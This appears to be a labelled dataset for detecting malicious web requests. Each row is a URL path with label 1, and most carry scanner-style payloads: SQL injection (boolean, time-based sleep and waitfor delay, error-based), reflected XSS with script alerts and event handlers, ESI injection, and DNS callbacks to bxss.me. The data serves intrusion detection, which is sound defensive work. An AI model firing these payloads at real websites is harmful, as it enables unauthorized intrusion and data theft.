sentences	labels
/****/zjdt' and 2*3*8=6*8 and '0lgk'='0lgk/csjs/1.htm \r\n\r\n 	 1
/****/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/***/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/****/system/2021/05/07/javascript:window.close(); \r\n\r\n 	 1
/****/20211011/javascript:void(0); \r\n\r\n 	 1
/****/xxczh1%' and 2*3*8=6*8 and 'pjfr'!='pjfr%/ywdt/11.htm \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/1079/1081/list.html \r\n\r\n 	 1
/**********/system/2021/10/27/javascript:window.close(); \r\n\r\n 	 1
/************/http://bxss.me/t/fit.txt?.jpg/jcse/website.js \r\n\r\n 	 1
/****/system/2012/07/03/javascript:dozoom(9) \r\n\r\n 	 1
/********/template.cfm?moduletitle=alert(777) \r\n\r\n 	 1
/**********/system/2021/12/14/javascript:window.close(); \r\n\r\n 	 1
/****/gccb/jcgc%' and 2*3*8=6*8 and 'usup'!='usup%/ \r\n\r\n 	 1
/**/aboutus/messagefromchairman/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/bxss.me/202012/t20201225_2539623.html \r\n\r\n 	 1
/wp-content/******/enfold/archive.php \r\n\r\n 	 1
/****/xxxsd/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/zjdt/czjs/gzdt/command/cmd \r\n\r\n 	 1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/****/system/2021/12/18/javascript:void(0); \r\n\r\n 	 1
/**********/system/2021/11/20/javascript:void(0); \r\n\r\n 	 1
/wp-content/******/seowp/all-icons-page.php \r\n\r\n 	 1
/****/web/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(51550)</script> \r\n\r\n 	 1
/*****/gywm/flgw/""><script>alert(215)</script> \r\n\r\n 	 1
/**/system/2021/01/21/javascript:void(0); \r\n\r\n 	 1
/************/template/jcse/110105008056111/bxss.me/images/hanweb.css \r\n\r\n 	 1
/**********/0'xor(if(now()=sysdate(),sleep(6),0))xor'z-01-12.html \r\n\r\n 	 1
/**/system/count/0006017/000000000000/window.location.href \r\n\r\n 	 1
/****/nxqlzhkjzt/ \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list'||'.html \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(6545)</script>?_=1630312392672 \r\n\r\n 	 1
/****/web/search?perpage=20' waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10 \r\n\r\n 	 1
/****/bmkx/sgaj/201812/t20181208_'.gethostbyname(lc('hitis'.'inaqwueoff407.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(75).chr(118).chr(74).'.html \r\n\r\n 	 1
/**/photostore/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> \r\n\r\n 	 1
/**/index.php?do=post&id=319&c=dt&a=goods& \r\n\r\n 	 1
/******/resource%' and 2*3*8=6*8 and '0otc'!='0otc%/js/newcalendar/calendar.js \r\n\r\n 	 1
/****/category/sichouzhiluwenda?page=1'"()&%<acu><script>9112(9131)</script> \r\n\r\n 	 1
/******/static/js/core/window.location.href,title:document.title,container:s.selector,fragment:e.fragment,timeout:e.timeout},window.history.replacestate(a.state,document.title));var \r\n\r\n 	 1
/*******/2nl18r.php \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 6637=6637 and '1'='1&outlinepage=10 \r\n\r\n 	 1
/**/images/idangerous.swiper.css/*/-->'""></iframe></script></style></title></textarea><script >alert(28137)</script> \r\n\r\n 	 1
/****/system/2012/03/23/javascript:dozoom(9) \r\n\r\n 	 1
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/style.css \r\n\r\n 	 1
/**********/system/2013/10/21/011213243_02.shtml \r\n\r\n 	 1
/**/includes-css-modules.php \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4980)">?_=1630312232645 \r\n\r\n 	 1
/*******/6o3qly.php \r\n\r\n 	 1
/******/457/phone.js/"><script>alert(7522)</script> \r\n\r\n 	 1
/******/'""()&%<acx><script >gejm(9387)</script>/grouppic/jquery.ad-gallery.js \r\n\r\n 	 1
/****/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 1
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 1
/****/"".gethostbyname(lc(""hitgl"".""dqpwcwph4428a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(110).chr(83).""/sgaj/201812/t20181208_112298.html \r\n\r\n 	 1
/**********/system/2021/11/18/javascript:window.print() \r\n\r\n 	 1
/***/index.php?c=user&a=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"// \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1105662730)))and'&i_columnid[1]==1&i_webid=1&type=1 \r\n\r\n 	 1
/******/web_front.js/<img src="javascript:alert(508)"> \r\n\r\n 	 1
/****/web/search?page=2&channelid=-1) or 3552=8536#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/investors-garden/******/intermediary/2020-07-15/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.html \r\n\r\n 	 1
socket.gethostbyname(""hithn"" ""iwcyplpfd267b.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js \r\n\r\n 	 1
/****/system/2020/07/03/javascript:void(); \r\n\r\n 	 1
/***/0/00/59/50/595051_356657.jpg \r\n\r\n 	 1
/**/system/count/0006011/000000000000/window.location.href \r\n\r\n 	 1
/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/****/system/2021/01/15/javascript:window.close(); \r\n\r\n 	 1
/****/bysrd/201610/t20161016_531.html?leader=薛香玲<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 1
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html \r\n\r\n 	 1
/****/system/2021/12/20/javascript:dozoom(14) \r\n\r\n 	 1
/***/mobile_h5/waparticledetail.do?article_id=202101282332571214&contenttype=article \r\n\r\n 	 1
/****/ad_js.php?aid=14&c=assert \r\n\r\n 	 1
/****/system/2017/04/07/javascript:dozoom(12) \r\n\r\n 	 1
/****/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 1
/****/main/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 \r\n\r\n 	 1
/******/web/jpage/theme/simple'||'/css/jpage.css \r\n\r\n 	 1
/****/system/2021/12/17/javascript:window.close(); \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'wppg'='wppg/****/bmjs/gdyx/ \r\n\r\n 	 1
/*/public/viewclick/?addclick=1&classid=105&id=-1; waitfor delay '0:0:8.654' --  \r\n\r\n 	 1
/******/n42746/c1723818/content'||'.html \r\n\r\n 	 1
/******/system/2021/11/27/javascript:void(); \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 1043=1043 and '%'=' \r\n\r\n 	 1
/*****/system/2019/09/20/javascript:void(0); \r\n\r\n 	 1
/*****/system/2021/04/04/javascript:void(); \r\n\r\n 	 1
/**/ui/widgets/hanweb<esi:include src=""http://bxss.me/rpb.png""/>/ie6fixed/ie6fixed.js \r\n\r\n 	 1
/*****/system/2021/08/20/javascript:window.close(); \r\n\r\n 	 1
/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> \r\n\r\n 	 1
/****/cat1.php?id2=0&pricestart=0&room=&flache=&price=&zulassung=&kilometer=&kraftstoff=&id3=0&suche="><script>alert(777);</script>&id=0&suchewo=&umkreis=0 \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%') and 8506=3217  \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images'||'/plugin/criteria/css.css \r\n\r\n 	 1
/**********/system/2021/07/05/javascript:void(0); \r\n\r\n 	 1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\"javascript:void(0)\" \r\n\r\n 	 1
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0) \r\n\r\n 	 1
/****/rdjy/202012/t20201225_2539623'""()&%<acx><script >cfsb(9973)</script>.html \r\n\r\n 	 1
/*******/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 1
/****/system/2021/12/06/javascript:window.close(); \r\n\r\n 	 1
/****/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 1
/****/rdjy/202012/t20201225_2539623<esi:include src=""http://bxss.me/rpb.png""/>.html \r\n\r\n 	 1
/****/system/2021/12/17/javascript:window.print() \r\n\r\n 	 1
/*****/20190522/javascript:void(0); \r\n\r\n 	 1
/****/wdsjs/hfswsj/zmhdyc'||'.html \r\n\r\n 	 1
/****/admin.php?cont=store_nas \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1') and 7989=0840 and '1'='1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/xxgk'""()&%<acx><script >gva8(9864)</script>/*****/1088/1105/list.html \r\n\r\n 	 1
/****/jsly/gcdzyqzysjx/201501/t20150129_52362.html' and 'x'='y \r\n\r\n 	 1
